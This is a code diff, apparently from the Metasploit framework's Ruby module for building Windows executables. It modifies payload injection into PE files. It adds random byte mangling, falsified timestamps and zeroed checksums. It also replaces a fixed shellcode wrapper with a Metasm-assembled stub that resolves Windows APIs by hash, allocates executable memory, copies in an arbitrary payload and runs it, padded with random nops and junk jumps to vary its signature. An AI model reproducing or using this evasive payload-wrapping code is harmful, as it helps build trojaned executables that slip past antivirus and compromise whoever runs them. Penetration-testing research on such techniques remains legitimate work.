@@ -16,7 +16,7 @@ class EXE
 require 'rex'
 require 'rex/peparsey'
 require 'rex/pescan'
-
+require 'metasm'
 
 	##
 	#
@@ -157,6 +157,11 @@ require 'rex/pescan'
 		# Relative jump from the end of the nops to the payload
 		entry += "\xe9" + [poff - (eidx + entry.length + 5)].pack('V')
 
+		# Mangle random bits of the original executable
+		1.upto(rand(block[1] / 512)) do
+		 	data[ block[0] + rand(block[1]), 1] = [rand(0x100)].pack("C")
+		end
+
 		# Patch the payload and the new entry point into the .text
 		data[block[0] + poff, payload.length] = payload
 		data[block[0] + eidx, entry.length]   = entry
@@ -168,7 +173,17 @@ require 'rex/pescan'
 		end
 		exe[ exe.index([pe.hdr.opt.AddressOfEntryPoint].pack('V')), 4] = [ text.base_rva + block[0] + eidx ].pack("V")
 		exe[off_beg, data.length] = data
+
+		tds = pe.hdr.file.TimeDateStamp
+		exe[ exe.index([ tds ].pack('V')), 4] = [tds - rand(0x1000000)].pack("V")
+
+		cks = pe.hdr.opt.CheckSum
+		if(cks != 0)
+			exe[ exe.index([ cks ].pack('V')), 4] = [0].pack("V")
+		end
+
 		pe.close
+
 		exe
 	end
 
@@ -559,28 +574,205 @@ require 'rex/pescan'
 	# target code there, setting an exception handler that calls ExitProcess
 	# and finally executing the code.
 	def self.win32_rwx_exec(code)
-		wrapper =
-		# Length: 233 bytes
-		# CodeLen Offset: 145
-		# ExitFunk Offset: 186
-		"\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" +
-		"\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0" +
-		"\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57" +
-		"\x8B\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01" +
-		"\xD0\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B" +
-		"\x01\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4" +
-		"\x03\x7D\xF8\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B" +
-		"\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24" +
-		"\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D" +
-		"\xBE\x78\x56\x34\x12\x6A\x40\x68\x00\x10\x00\x00\x56\x6A\x00\x68" +
-		"\x58\xA4\x53\xE5\xFF\xD5\x89\xC3\x89\xC7\x89\xF1\xE8\x33\x00\x00" +
-		"\x00\x5E\xF3\xA4\xE8\x1F\x00\x00\x00\xBB\xE0\x1D\x2A\x0A\x68\xA6" +
-		"\x95\xBD\x9D\xFF\xD5\x3C\x06\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47" +
-		"\x13\x72\x6F\x6A\x00\x53\xFF\xD5\x31\xC0\x64\xFF\x30\x64\x89\x20" +
-		"\xFF\xD3\xEB\xD5\xE8\xC8\xFF\xFF\xFF"
 
-		res = wrapper + code
-		res[145,4] = [code.length].pack('V')
+		stub_block = %Q^
+		; Input: The hash of the API to call and all its parameters must be pushed onto stack.
+		; Output: The return value from the API call will be in EAX.
+		; Clobbers: EAX, ECX and EDX (ala the normal stdcall calling convention)
+		; Un-Clobbered: EBX, ESI, EDI, ESP and EBP can be expected to remain un-clobbered.
+		; Note: This function assumes the direction flag has allready been cleared via a CLD instruction.
+		; Note: This function is unable to call forwarded exports.
+
+		api_call:
+		  pushad                 ; We preserve all the registers for the caller, bar EAX and ECX.
+		  mov ebp, esp           ; Create a new stack frame
+		  xor edx, edx           ; Zero EDX
+		  mov edx, [fs:edx+48]   ; Get a pointer to the PEB
+		  mov edx, [edx+12]      ; Get PEB->Ldr
+		  mov edx, [edx+20]      ; Get the first module from the InMemoryOrder module list
+		next_mod:                ;
+		  mov esi, [edx+40]      ; Get pointer to modules name (unicode string)
+		  movzx ecx, word [edx+38] ; Set ECX to the length we want to check
+		  xor edi, edi           ; Clear EDI which will store the hash of the module name
+		loop_modname:            ;
+		  xor eax, eax           ; Clear EAX
+		  lodsb                  ; Read in the next byte of the name
+		  cmp al, 'a'            ; Some versions of Windows use lower case module names
+		  jl not_lowercase       ;
+		  sub al, 0x20           ; If so normalise to uppercase
+		not_lowercase:           ;
+		  ror edi, 13            ; Rotate right our hash value
+		  add edi, eax           ; Add the next byte of the name
+		  loop loop_modname      ; Loop untill we have read enough
+		  ; We now have the module hash computed
+		  push edx               ; Save the current position in the module list for later
+		  push edi               ; Save the current module hash for later
+		  ; Proceed to itterate the export address table,
+		  mov edx, [edx+16]      ; Get this modules base address
+		  mov eax, [edx+60]      ; Get PE header
+		  add eax, edx           ; Add the modules base address
+		  mov eax, [eax+120]     ; Get export tables RVA
+		  test eax, eax          ; Test if no export address table is present
+		  jz get_next_mod1       ; If no EAT present, process the next module
+		  add eax, edx           ; Add the modules base address
+		  push eax               ; Save the current modules EAT
+		  mov ecx, [eax+24]      ; Get the number of function names
+		  mov ebx, [eax+32]      ; Get the rva of the function names
+		  add ebx, edx           ; Add the modules base address
+		  ; Computing the module hash + function hash
+		get_next_func:           ;
+		  jecxz get_next_mod     ; When we reach the start of the EAT (we search backwards), process the next module
+		  dec ecx                ; Decrement the function name counter
+		  mov esi, [ebx+ecx*4]   ; Get rva of next module name
+		  add esi, edx           ; Add the modules base address
+		  xor edi, edi           ; Clear EDI which will store the hash of the function name
+		  ; And compare it to the one we want
+		loop_funcname:           ;
+		  xor eax, eax           ; Clear EAX
+		  lodsb                  ; Read in the next byte of the ASCII function name
+		  ror edi, 13            ; Rotate right our hash value
+		  add edi, eax           ; Add the next byte of the name
+		  cmp al, ah             ; Compare AL (the next byte from the name) to AH (null)
+		  jne loop_funcname      ; If we have not reached the null terminator, continue
+		  add edi, [ebp-8]       ; Add the current module hash to the function hash
+		  cmp edi, [ebp+36]      ; Compare the hash to the one we are searchnig for
+		  jnz get_next_func      ; Go compute the next function hash if we have not found it
+		  ; If found, fix up stack, call the function and then value else compute the next one...
+		  pop eax                ; Restore the current modules EAT
+		  mov ebx, [eax+36]      ; Get the ordinal table rva
+		  add ebx, edx           ; Add the modules base address
+		  mov cx, [ebx+2*ecx]    ; Get the desired functions ordinal
+		  mov ebx, [eax+28]      ; Get the function addresses table rva
+		  add ebx, edx           ; Add the modules base address
+		  mov eax, [ebx+4*ecx]   ; Get the desired functions RVA
+		  add eax, edx           ; Add the modules base address to get the functions actual VA
+		  ; We now fix up the stack and perform the call to the desired function...
+		finish:
+		  mov [esp+36], eax      ; Overwrite the old EAX value with the desired api address for the upcoming popad
+		  pop ebx                ; Clear off the current modules hash
+		  pop ebx                ; Clear off the current position in the module list
+		  popad                  ; Restore all of the callers registers, bar EAX, ECX and EDX which are clobbered
+		  pop ecx                ; Pop off the origional return address our caller will have pushed
+		  pop edx                ; Pop off the hash value our caller will have pushed
+		  push ecx               ; Push back the correct return value
+		  jmp eax                ; Jump into the required function
+		  ; We now automagically return to the correct caller...
+		get_next_mod:            ;
+		  pop eax                ; Pop off the current (now the previous) modules EAT
+		get_next_mod1:           ;
+		  pop edi                ; Pop off the current (now the previous) modules hash
+		  pop edx                ; Restore our position in the module list
+		  mov edx, [edx]         ; Get the next module
+		  jmp short next_mod     ; Process this module
+		^
+
+		stub_exit = %Q^
+		; Input: EBP must be the address of 'api_call'.
+		; Output: None.
+		; Clobbers: EAX, EBX, (ESP will also be modified)
+		; Note: Execution is not expected to (successfully) continue past this block
+
+		exitfunk:
+		  mov ebx, 0x0A2A1DE0    ; The EXITFUNK as specified by user...
+		  push 0x9DBD95A6        ; hash( "kernel32.dll", "GetVersion" )
+		  call ebp               ; GetVersion(); (AL will = major version and AH will = minor version)
+		  cmp al, byte 6         ; If we are not running on Windows Vista, 2008 or 7
+		  jl short goodbye       ; Then just call the exit function...
+		  cmp bl, 0xE0           ; If we are trying a call to kernel32.dll!ExitThread on Windows Vista, 2008 or 7...
+		  jne short goodbye      ;
+		  mov ebx, 0x6F721347    ; Then we substitute the EXITFUNK to that of ntdll.dll!RtlExitUserThread
+		goodbye:                 ; We now perform the actual call to the exit function
+		  push byte 0            ; push the exit function parameter
+		  push ebx               ; push the hash of the exit function
+		  call ebp               ; call EXITFUNK( 0 );
+		^
+
+		stub_alloc = %Q^
+		  cld                    ; Clear the direction flag.
+		  call start             ; Call start, this pushes the address of 'api_call' onto the stack.
+		delta:                   ;
+		#{stub_block}
+		start:                   ;
+		  pop ebp                ; Pop off the address of 'api_call' for calling later.
+
+		allocate_size:
+		   mov esi,PAYLOAD_SIZE
+
+		allocate:
+		  push byte 0x40         ; PAGE_EXECUTE_READWRITE
+		  push 0x1000            ; MEM_COMMIT
+		  push esi               ; Push the length value of the wrapped code block
+		  push byte 0            ; NULL as we dont care where the allocation is.
+		  push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
+		  call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
+
+		  mov ebx, eax           ; Store allocated address in ebx
+		  mov edi, eax           ; Prepare EDI with the new address
+		  mov ecx, esi           ; Prepare ECX with the length of the code
+		  call get_payload
+		got_payload:
+		  pop esi                ; Prepare ESI with the source to copy
+		  rep movsb              ; Copy the payload to RWX memory
+		  call set_handler       ; Configure error handling
+
+		exitblock:
+		#{stub_exit}
+		set_handler:
+		  xor eax,eax
+		  push dword [fs:eax]
+		  mov dword [fs:eax], esp
+		  call ebx
+		  jmp short exitblock
+		^
+
+		stub_final = %Q^
+		get_payload:
+		  call got_payload
+		payload:
+		; Append an arbitary payload here
+		^
+
+
+		stub_alloc.gsub!('short', '')
+		stub_alloc.gsub!('byte', '')
+
+		wrapper = ""
+		# regs    = %W{eax ebx ecx edx esi edi ebp}
+
+		cnt_jmp = 0
+		cnt_nop = 64
+
+		stub_alloc.each_line do |line|
+			line.gsub!(/;.*/, '')
+			line.strip!
+			next if line.empty?
+
+			if (cnt_nop > 0 and rand(4) == 0)
+				wrapper << "nop\n"
+				cnt_nop -= 1
+			end
+
+			if(cnt_nop > 0 and rand(16) == 0)
+				cnt_nop -= 2
+				cnt_jmp += 1
+
+				wrapper << "jmp autojump#{cnt_jmp}\n"
+				1.upto(rand(8)+1) do
+				 	wrapper << "db 0x#{"%.2x" % rand(0x100)}\n"
+				 	cnt_nop -= 1
+				end
+				wrapper << "autojump#{cnt_jmp}:\n"
+			end
+			wrapper << line + "\n"
+		end
+
+		wrapper << stub_final
+
+		enc = Metasm::Shellcode.assemble(Metasm::Ia32.new, wrapper).encoded
+		off = enc.offset_of_reloc('PAYLOAD_SIZE')
+		res = enc.data + code
+
+		res[off,4] = [code.length].pack('V')
 		res
 	end
 
